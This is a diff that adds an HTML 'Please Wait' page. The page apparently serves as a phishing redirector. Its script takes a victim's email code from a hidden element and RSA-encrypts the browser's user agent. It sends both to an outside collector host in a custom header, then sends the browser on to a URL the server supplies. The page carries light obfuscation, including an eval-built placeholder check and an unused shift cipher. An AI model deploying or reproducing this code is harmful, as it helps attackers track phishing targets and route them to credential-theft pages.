@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Please Wait</title>
+</head>
+<body>
+<p id="uxo" style="display:none;">EMAIL_CODE</p>
+<h2>Please Wait......</h2>
+<script>
+
+function hh2(encryptedText, shift) {
+	let decryptedText = "";
+	for (let i = 0; i < encryptedText.length; i++) {
+	    let c = encryptedText[i];
+	    if (c.match(/[a-z]/i)) {
+	        let code = encryptedText.charCodeAt(i);
+	        if ((code >= 65) && (code <= 90)) {
+	            c = String.fromCharCode(((code - 65 - shift + 26) % 26) + 65);
+	        }
+	        else if ((code >= 97) && (code <= 122)) {
+	            c = String.fromCharCode(((code - 97 - shift + 26) % 26) + 97);
+	        }
+	    }
+	    decryptedText += c;
+	}
+
+	return decryptedText;
+}
+
+function pemToUint8Array(pem) {
+  const base64String = pem
+    .replace('-----BEGIN PUBLIC KEY-----', '')
+    .replace('-----END PUBLIC KEY-----', '')
+    .replace(/\s+/g, '');
+  
+  const byteArray = atob(base64String).split('').map(char => char.charCodeAt(0));
+  return new Uint8Array(byteArray);
+}
+
+function arrayBufferToBase64(buffer) {
+  let binary = '';
+  let bytes = new Uint8Array(buffer);
+  for (var i = 0; i < bytes.byteLength; i++) {
+    binary += String.fromCharCode(bytes[i]);
+  }
+  return window.btoa(binary);
+}
+
+let sx = "https://gdcollector.com/?spqyjmxe";
+
+const PUBLIC_KEY_PERM = `-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvUGIXe+aVAFb7WAJsST0
+WBHCrqsf2AFy/qZrhFlgNvsC3qbA9ONuEQ4MY31DtCQ5z65rjONYcZ1xGkJ2JCU4
+8VSVvNXAWG4Yte7btW6AKIQpcxOyqkWnPyPaNyV8+/3S6gLeWznzEy7CgGfuT07Y
+i9Uje+C1N/8IqUIBuKsAVdCC+DLs4jrVHVoQT1RtHMKMXHClxnT1VvChGOu6qn+q
+Ndaw9i9LUnHlQwCN+aqK9Jp6A89+2pkxp0+WpqT/oq0G6xv4aznV7ORrNqSaiq0X
+9iMlk20XPhhZLmTV7USF4MZIqVKzBdNwm7KqdRUfN3sQtKsKuGWud5VmSfIQHk6S
+JQIDAQAB
+-----END PUBLIC KEY-----
+`
+
+const publicKey = pemToUint8Array(PUBLIC_KEY_PERM)
+
+let el1 = document.getElementById("uxo");
+let tl1 = el1.innerText;
+if (!tl1 || tl1 === eval(`'E'+'MAIL'+'_'+'CODE'`)) {
+    sx = sx
+} else {
+    sx = sx + '&qrc=' + tl1
+}
+
+let lTime = 0
+const eD = document.getElementById("errorId");
+let xhr = new XMLHttpRequest();
+
+window.crypto.subtle.importKey(
+  "spki",
+  publicKey,
+  {
+    name: "RSA-OAEP",
+    hash: "SHA-256"
+  },
+  false,
+  ["encrypt"]
+).then(publicKeyMaterial => {
+  const encodedUserAgent = new TextEncoder().encode(navigator.userAgent);
+
+  return window.crypto.subtle.encrypt(
+    {
+      name: "RSA-OAEP"
+    },
+    publicKeyMaterial,
+    encodedUserAgent
+  );
+}).then(encryptedUserAgent => {
+  const encryptedUserAgentBase64 = arrayBufferToBase64(encryptedUserAgent);
+	xhr.open('GET', sx, true);
+	xhr.setRequestHeader("accept", "application/json"); 
+	xhr.setRequestHeader("qrc-auth", encryptedUserAgentBase64); 
+
+	xhr.send();
+})
+
+
+
+
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === XMLHttpRequest.DONE) {
+    if (xhr.status === 200) {
+      const cc = JSON.parse(xhr.responseText)
+      if (cc.url) {
+        window.location = cc.url
+      } else {
+      		document.body.innerHTML = cc.error? cc.error : 'ACCESS DENIED';
+      }
+    } else {
+      document.body.innerHTML = 'CONNECTION TO HOST FAILED';
+    }
+  }
+};
+xhr.send();
+   
+</script>
+</body>
+</html>
